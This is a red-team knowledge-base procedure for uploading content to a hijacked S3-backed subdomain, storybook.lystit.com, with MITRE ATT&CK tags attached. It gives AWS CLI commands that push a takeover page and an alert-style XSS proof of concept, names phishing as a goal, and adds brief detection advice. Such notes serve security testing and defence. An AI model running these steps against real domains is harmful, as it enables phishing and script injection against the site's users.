---
tags:
  - aws-s3
  - file-upload
  - xss
  - phishing
type: procedure
tools:
  - '[[tools/AWS-CLI]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/aws-upload-file]]'
verified: false
platforms:
  - AWS
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T04:39:01.909Z'
sub_techniques: []
id: eaa720ae-32d4-49e0-b3a4-fa457762ddaf
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Upload Malicious Content to Hijacked Subdomain

## Summary

This procedure uploads arbitrary files, including proof-of-control pages and XSS payloads, to the controlled S3 bucket for serving via the subdomain.

## Description

With hosting enabled, upload HTML files to the bucket root. This allows serving malicious content like phishing pages or XSS scripts when users access the subdomain. The attack demonstrates control and potential for broader impacts like SOP bypass on lystit.com.

## Requirements

1. Configured S3 bucket with public read
2. Local files prepared (e.g., index.html, XSS POC)
3. AWS CLI access

## Defense

Defensive measures and detection strategies:

- Enable S3 access logging and monitor uploads
- Scan uploaded content with antivirus/malware tools
- Implement WAF rules to block anomalous subdomain content

## Objectives

1. Deploy proof-of-concept files
2. Enable XSS or phishing delivery
3. Demonstrate subdomain control

## Instructions

### Step 1: Prepare and Upload Files

**Context**: Create and sync malicious content to the bucket.

**Command** ([[commands/aws-upload-file]]):
```bash
echo '<h1>Subdomain Taken Over</h1>' > index.html
echo '<script>alert("XSS POC")</script>' > asdjklkas1312das879123.html
aws s3 cp index.html s3://storybook.lystit.com/
aws s3 cp asdjklkas1312das879123.html s3://storybook.lystit.com/
```

> This creates and uploads files. Expected output: Upload complete. Files now servable at http://storybook.lystit.com/asdjklkas1312das879123.html.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used

- [[commands/aws-upload-file]]

## Tools Used

- [[tools/AWS-CLI]]

## Tags

- [[aws-s3]]
- [[file-upload]]
- [[xss]]
- [[Phishing]]
